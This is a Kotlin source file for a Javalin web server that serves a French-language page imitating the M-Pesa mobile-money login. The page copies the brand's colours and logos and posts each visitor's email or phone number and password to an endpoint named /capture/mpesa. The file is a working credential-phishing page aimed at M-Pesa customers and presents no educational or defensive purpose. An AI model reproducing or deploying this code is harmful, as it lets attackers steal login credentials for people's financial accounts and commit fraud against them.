package com.fardc.sigint.core
import io.javalin.Javalin

class Dashboard {
    fun setup(app: Javalin) {
        app.get("/login-mpesa") { ctx ->
            ctx.html("""
                <!DOCTYPE html>
                <html lang="fr">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>M-Pesa | Login</title>
                    <style>
                        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #e61c2b; margin: 0; display: flex; flex-direction: column; height: 100vh; }
                        .container { display: flex; justify-content: center; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 92%; max-width: 440px; }
                        .card { background: white; width: 100%; padding: 30px 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
                        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 35px; }
                        .brand { display: flex; align-items: center; gap: 8px; }
                        .login-title { font-size: 22px; font-weight: bold; color: #000; }
                        input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
                        .btn { width: 100%; padding: 16px; background-color: #e61c2b; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="card">
                            <div class="header">
                                <div class="brand">
                                    <svg width="35" height="35" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" stroke="#e61c2b" stroke-width="8" fill="none"/><circle cx="50" cy="50" r="20" fill="#e61c2b"/></svg>
                                    <div style="width:1px; height:30px; background:#ddd;"></div>
                                    <svg width="40" height="40" viewBox="0 0 100 100"><rect x="30" y="20" width="40" height="60" rx="5" fill="#e61c2b"/><rect x="35" y="25" width="30" height="40" fill="white"/><path d="M40 75 h20" stroke="white" stroke-width="5"/><path d="M20 40 Q 50 10 80 40" stroke="#4db848" stroke-width="8" fill="none"/></svg>
                                </div>
                                <div class="login-title">Login</div>
                            </div>
                            <form action="/capture/mpesa" method="POST">
                                <input type="text" name="user" placeholder="Email ou Numéro" required>
                                <input type="password" name="pin" placeholder="Mot de passe" required>
                                <button type="submit" class="btn">Login</button>
                            </form>
                        </div>
                    </div>
                </body>
                </html>
            """)
        }
    }
}
